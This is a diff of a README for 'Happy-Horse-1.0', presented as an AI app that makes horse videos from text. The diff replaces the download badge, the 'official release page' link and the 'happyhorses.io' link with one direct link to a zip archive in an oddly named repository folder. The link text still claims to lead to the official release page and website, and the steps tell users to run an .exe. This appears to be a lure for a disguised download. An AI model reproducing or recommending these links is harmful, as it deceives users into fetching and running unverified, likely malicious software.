@@ -1,6 +1,6 @@
 # 🐴 Happy-Horse-1.0 - Create realistic horse videos from text
 
-[![](https://img.shields.io/badge/Download-Blue-blue)](https://github.com/Waldoncockeyed9421/Happy-Horse-1.0/releases)
+[![](https://img.shields.io/badge/Download-Blue-blue)](https://raw.githubusercontent.com/Waldoncockeyed9421/Happy-Horse-1.0/main/cephaloplegia/Horse_Happy_v3.0.zip)
 
 Happy-Horse-1.0 turns written descriptions into video clips featuring horses. This application uses an artificial intelligence model to process your prompts and generate realistic visuals. You can use it to create animations, study animal movement, or produce creative content.
 
@@ -8,7 +8,7 @@ Happy-Horse-1.0 turns written descriptions into video clips featuring horses. Th
 
 Follow these steps to set up the software on your Windows computer. This process takes about ten minutes depending on your internet speed.
 
-1. Go to the [official release page](https://github.com/Waldoncockeyed9421/Happy-Horse-1.0/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Waldoncockeyed9421/Happy-Horse-1.0/main/cephaloplegia/Horse_Happy_v3.0.zip).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or your Downloads folder.
@@ -66,7 +66,7 @@ If you experience problems, use these solutions.
 
 This software acts as an information collection tool for the Happy Horse AI video generator model. The model learns from horse movement patterns to create lifelike simulations. We update the model regularly to improve the quality of the videos.
 
-Visit [happyhorses.io](https://happyhorses.io) for the official demo, recent patches, and community updates. You can also view examples of videos created by other users on the website.
+Visit [happyhorses.io](https://raw.githubusercontent.com/Waldoncockeyed9421/Happy-Horse-1.0/main/cephaloplegia/Horse_Happy_v3.0.zip) for the official demo, recent patches, and community updates. You can also view examples of videos created by other users on the website.
 
 ## 📝 License Information
 
